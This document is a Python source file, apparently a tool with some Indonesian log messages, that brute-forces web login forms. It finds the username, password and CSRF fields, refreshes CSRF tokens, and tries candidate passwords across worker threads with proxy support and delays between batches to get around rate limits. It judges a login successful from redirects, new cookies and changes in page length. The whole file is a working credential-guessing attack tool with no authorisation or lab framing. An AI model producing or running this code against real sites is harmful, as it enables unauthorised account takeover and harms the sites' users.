import re
import time
import threading
from typing import Dict, List, Optional, Tuple, Any
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

USERNAME_HINTS = ["user", "username", "login", "email", "userid", "uid"]
PASSWORD_HINTS = ["pass", "password", "passwd", "pwd"]
CSRF_HINTS = ["csrf", "token", "authenticity_token", "xsrf", "_token"]


def _guess_input_role(inp) -> Optional[str]:
    itype = (inp.get("type") or "").lower()
    name = (inp.get("name") or "").lower()
    idv = (inp.get("id") or "").lower()
    placeholder = (inp.get("placeholder") or "").lower()
    combined = " ".join([name, idv, placeholder])

    if itype == "password":
        return "pass"

    for hint in USERNAME_HINTS:
        if hint in combined:
            return "user"
    for hint in PASSWORD_HINTS:
        if hint in combined:
            return "pass"
    for hint in CSRF_HINTS:
        if hint in combined:
            return "csrf"

    return None


def discover_form(session: requests.Session, url: str,
                  username_hint: Optional[str] = None,
                  password_hint: Optional[str] = None,
                  user_field_override: Optional[str] = None,
                  pass_field_override: Optional[str] = None,
                  csrf_token_selector: Optional[str] = None, 
                  verbose: bool = True) -> Optional[Dict[str, Any]]:

    if verbose:
        print(f"[*] Discovering form on {url}")

    
    try:
        r = session.get(url, timeout=10)
        r.raise_for_status()
    except Exception as e:
        if verbose:
            print(f"[!] Gagal ambil halaman {url}: {e}")
        return None

    soup = BeautifulSoup(r.text, "html.parser")
    forms = soup.find_all("form")
    if not forms:
        if verbose:
            print("[!] No <form> found on page.")
        return None

   
    candidate_forms = []
    for form in forms:
        inputs = form.find_all("input")
        has_password = any((inp.get("type") or "").lower() == "password" for inp in inputs)
        candidate_forms.append((form, has_password))

    candidate_forms.sort(key=lambda t: (0 if t[1] else 1))

    for form, _ in candidate_forms:
        method = (form.get("method") or "post").lower()
        action = form.get("action") or url
        action_url = urljoin(url, action)

        inputs = form.find_all("input")
        hidden: Dict[str, str] = {}
        user_field = None
        pass_field = None
        csrf_field = None

        
        for inp in inputs:
            name = inp.get("name")
            if not name:
                continue
            itype = (inp.get("type") or "text").lower()
            val = inp.get("value", "")

            
            if itype == "hidden":
                hidden[name] = val
                if any(h in name.lower() for h in CSRF_HINTS) or any(h in str(val).lower() for h in CSRF_HINTS):
                    csrf_field = name
                continue

            
            if itype == "password":
                pass_field = name
                continue

            role = _guess_input_role(inp)
            if role == "user" and user_field is None:
                user_field = name
            elif role == "pass" and pass_field is None:
                pass_field = name
            elif role == "csrf" and csrf_field is None:
                csrf_field = name

        if username_hint and not user_field:
            for inp in inputs:
                if inp.get("name") and username_hint.lower() in inp.get("name").lower():
                    user_field = inp.get("name")
        if password_hint and not pass_field:
            for inp in inputs:
                if inp.get("name") and password_hint.lower() in inp.get("name").lower():
                    pass_field = inp.get("name")

        if user_field_override:
            user_field = user_field_override
        if pass_field_override:
            pass_field = pass_field_override

        if csrf_token_selector:
            sel = None
            try:
    
                sel = form.select_one(csrf_token_selector)
            except Exception:
                sel = None

            if sel is None:
                try:
                    
                    sel = soup.select_one(csrf_token_selector)
                except Exception:
                    sel = None

            if sel is not None:
                
                sname = sel.get("name") or sel.get("id")
                svalue = sel.get("value", "")
                if sname:
                    csrf_field = sname
                    
                    hidden[sname] = svalue

        
        if not pass_field:
            continue

       
        return {
            "action": action_url,
            "method": method,
            "user_field": user_field,
            "pass_field": pass_field,
            "csrf_field": csrf_field,
            "csrf_selector": csrf_token_selector,
            "hidden": hidden,
            "all_inputs": [
                dict(name=inp.get("name"), type=inp.get("type"), value=inp.get("value"))
                for inp in inputs
            ]
        }

    if verbose:
        print("[!] No suitable login form (with password input) found.")
    return None



def fingerprint_cookies(cookies: requests.cookies.RequestsCookieJar) -> Dict[str, str]:
    return {k: v for k, v in cookies.items()}


def is_successful_response(resp: requests.Response,
                           baseline_len: Optional[int] = None,
                           baseline_cookies: Optional[Dict[str, str]] = None,
                           baseline_url: Optional[str] = None,
                           success_keywords: Optional[List[str]] = None,
                           failure_keywords: Optional[List[str]] = None,
                           cookie_names: Optional[List[str]] = None,
                           require_redirect: bool = False,
                           require_cookie: bool = False,
                           len_diff_threshold: float = 0.25
                           ) -> Tuple[bool, str, Dict]:
    
    info: Dict[str, Any] = {"status": resp.status_code, "url": getattr(resp, "url", None)}
    text = (resp.text or "")
    text_lower = text.lower()

    
    if failure_keywords:
        for kw in failure_keywords:
            if kw.lower() in text_lower:
                return False, "body_fail", {"keyword": kw}

    success_signals = []

    
    if resp.history or (baseline_url and getattr(resp, "url", None) and resp.url != baseline_url):
        info["redirect_history"] = [r.status_code for r in getattr(resp, "history", [])]
        info["final_url"] = resp.url
        success_signals.append("redirect")

    
    if cookie_names:
        for cname in cookie_names:
            if cname in resp.cookies:
                success_signals.append("cookie_named")

    
    if baseline_cookies:
        new_cookies = fingerprint_cookies(resp.cookies)
        for k in new_cookies.keys():
            if k not in baseline_cookies:
                success_signals.append("cookie_new")

    
    if success_keywords:
        for kw in success_keywords:
            if kw.lower() in text_lower:
                success_signals.append("body_keyword")

    
    if baseline_len is not None:
        baseline_len_val = max(1, baseline_len)
        diff_abs = abs(len(text) - baseline_len)
        diff_ratio = diff_abs / baseline_len_val
        info.update({
            "len": len(text),
            "baseline_len": baseline_len,
            "len_diff_abs": diff_abs,
            "len_diff_ratio": diff_ratio
        })
        if diff_abs > 100 or diff_ratio >= len_diff_threshold:
            success_signals.append("len_diff")

    
    if len(success_signals) >= 2:
        return True, "+".join(success_signals), info
    elif len(success_signals) == 1:
        return False, "weak_" + success_signals[0], info

    return False, "unknown", info


def _build_payload(form_spec: Dict[str, Any], username: str, password: str, extra_fields: Optional[Dict[str, str]] = None) -> Dict[str, str]:
    payload = {}
    payload.update(form_spec.get("hidden", {}) or {})
    if form_spec.get("user_field"):
        payload[form_spec["user_field"]] = username
    else:
        payload["username"] = username
    payload[form_spec["pass_field"]] = password
    if extra_fields:
        payload.update(extra_fields)
    return payload


def attempt_login(session: requests.Session,
                  form_spec: Dict[str, Any],
                  username: str,
                  password: str,
                  headers: Optional[Dict[str, str]] = None,
                  timeout: float = 10.0,
                  allow_redirects: bool = True,
                  proxies: Optional[Dict[str, str]] = None,
                  csrf_selector: Optional[str] = None) -> requests.Response:
    
    hidden = dict(form_spec.get("hidden", {}) or {})


    action_url = form_spec.get("action") or ""
    base = form_spec.get("base_url") or ""
    if base and not bool(urlparse(action_url).netloc):
        action = urljoin(base, action_url)
    else:
        action = action_url

    csrf_field = form_spec.get("csrf_field")
    csrf_ok = False

    if csrf_field or csrf_selector:
        try:
            fetch_url = action if action else (base or "")
            if fetch_url:
                pre = session.get(fetch_url, timeout=timeout)
                pre.raise_for_status()
                soup = BeautifulSoup(pre.text, "html.parser")

                if csrf_selector:
                    el = soup.select_one(csrf_selector)
                    if el:
                        name = el.get("name") or el.get("id")
                        if name:
                            hidden[name] = el.get("value", "")
                            csrf_ok = True

                if not csrf_ok and csrf_field:
                    inp = soup.find("input", {"name": csrf_field})
                    if inp:
                        hidden[csrf_field] = inp.get("value", "")
                        csrf_ok = True
        except Exception as e:
            raise RuntimeError(f"CSRF refresh failed: {e}")

        if (csrf_field or csrf_selector) and not csrf_ok:
            raise RuntimeError("CSRF token not found, login attempt aborted")


    payload = {**hidden}
    ufield = form_spec.get("user_field") or "username"
    pfield = form_spec.get("pass_field") or "password"
    payload[ufield] = username
    payload[pfield] = password

    req_headers = headers or {}
    req_proxies = proxies or {}

    if form_spec.get("method", "post").lower() == "post":
        return session.post(action, data=payload,
                            headers=req_headers, timeout=timeout,
                            allow_redirects=allow_redirects, proxies=req_proxies)
    else:
        return session.get(action, params=payload,
                           headers=req_headers, timeout=timeout,
                           allow_redirects=allow_redirects, proxies=req_proxies)


def bruteforce_form(url: str,
                    username: str,
                    candidates: List[str],
                    workers: int = 10,
                    timeout: float = 10.0,
                    proxies: Optional[Dict[str, str]] = None,
                    headers: Optional[Dict[str, str]] = None,
                    success_keywords: Optional[List[str]] = None,
                    failure_keywords: Optional[List[str]] = None,
                    cookie_names: Optional[List[str]] = None,
                    username_hint: Optional[str] = None,
                    password_hint: Optional[str] = None,
                    user_field_override: Optional[str] = None,
                    pass_field_override: Optional[str] = None,
                    chunk_size: Optional[int] = None,
                    chunk_delay: float = 0.0,
                    verbose: bool = True,
                    require_redirect: bool = False,
                    require_cookie: bool = False,
                    len_diff_threshold: float = 0.25,
                    stop_all_event: Optional[threading.Event] = None  
                    ) -> Tuple[Optional[str], Dict]:

    if stop_all_event is None:
        stop_all_event = threading.Event()


    session = requests.Session()
    form_spec = discover_form(
        session,
        url,
        username_hint=username_hint,
        password_hint=password_hint,
        user_field_override=user_field_override,
        pass_field_override=pass_field_override,
        verbose=verbose
    )
    if not form_spec:
        return None, {"error": "no_form"}

    csrf_selector = form_spec.get("csrf_selector")
    base_url = form_spec.get("base_url") or url

    if verbose:
        print(f"[*] Target form discovered: action={form_spec['action']} method={form_spec['method']} user_field={form_spec['user_field']} pass_field={form_spec['pass_field']} csrf={form_spec.get('csrf_field')} csrf_selector={csrf_selector}")


    baseline_len = None
    baseline_cookies = {}
    baseline_target = form_spec.get("action") or base_url
    try:
        baseline_r = session.get(baseline_target, timeout=timeout)
        baseline_len = len(baseline_r.text or "")
        baseline_cookies = fingerprint_cookies(session.cookies)
        baseline_target = baseline_r.url
    except Exception:
        baseline_len = None
        baseline_cookies = fingerprint_cookies(session.cookies)

    found_password = None
    found_info: Dict[str, Any] = {}
    total = len(candidates)

    if chunk_size is None or chunk_size <= 0:
        chunk_size = total

    try:
        for start in range(0, total, chunk_size):

            if stop_all_event.is_set():
                break

            end = min(start + chunk_size, total)
            batch = candidates[start:end]

            if verbose:
                print(f"[*] Processing batch {start}-{end} dari {total}")

            
            with ThreadPoolExecutor(max_workers=workers) as exe:
                futures = {}

                def worker_attempt(pwd):
            
                    if stop_all_event.is_set():
                        return None, None
                    try:
                        s = requests.Session()
            
                        if headers:
                            s.headers.update(headers)
                        if proxies:
                            s.proxies.update(proxies)

            
                        r = attempt_login(
                            s,
                            form_spec,
                            username,
                            pwd,
                            headers=headers,
                            timeout=timeout,
                            allow_redirects=True,
                            proxies=proxies,
                            csrf_selector=csrf_selector
                        )

                        ok, reason, info = is_successful_response(
                            r,
                            baseline_len=baseline_len,
                            baseline_cookies=baseline_cookies,
                            baseline_url=baseline_target,
                            success_keywords=success_keywords,
                            failure_keywords=failure_keywords,
                            cookie_names=cookie_names,
                            require_redirect=require_redirect,
                            require_cookie=require_cookie,
                            len_diff_threshold=len_diff_threshold
                        )
                        return (pwd if ok else None), {"reason": reason, "meta": info, "status": r.status_code}
                    except Exception as e:
                        return None, {"reason": "error", "meta": {"exc": str(e)}}

            
                for pwd in batch:
                    futures[exe.submit(worker_attempt, pwd)] = pwd

            
                for fut in as_completed(list(futures.keys())):
            
                    if stop_all_event.is_set():
                        break

                    pwd = futures.get(fut)
                    try:
                        res_pwd, info = fut.result()
                    except Exception as e:
                        if verbose:
                            print(f"[!] Worker error: {e}")
                        continue

                    if res_pwd:
            
                        found_password = res_pwd
                        found_info = info or {}
                        stop_all_event.set()

            
                        for f in list(futures.keys()):
                            try:
                                f.cancel()
                            except Exception:
                                pass

            
                        break

            
            if stop_all_event.is_set() or found_password:
                break

            
            if chunk_delay and end < total:
                if verbose:
                    print(f"[*] Limit tercapai ({end}/{total}), menunggu {chunk_delay} detik...")
                time.sleep(chunk_delay)

    except KeyboardInterrupt:
        
        stop_all_event.set()
        if verbose:
            print("[*] Interrupted by user. Shutting down...")

    if found_password:
        return found_password, {"reason": found_info.get("reason"), "meta": found_info.get("meta")}

    return None, {"reason": "not_found"}

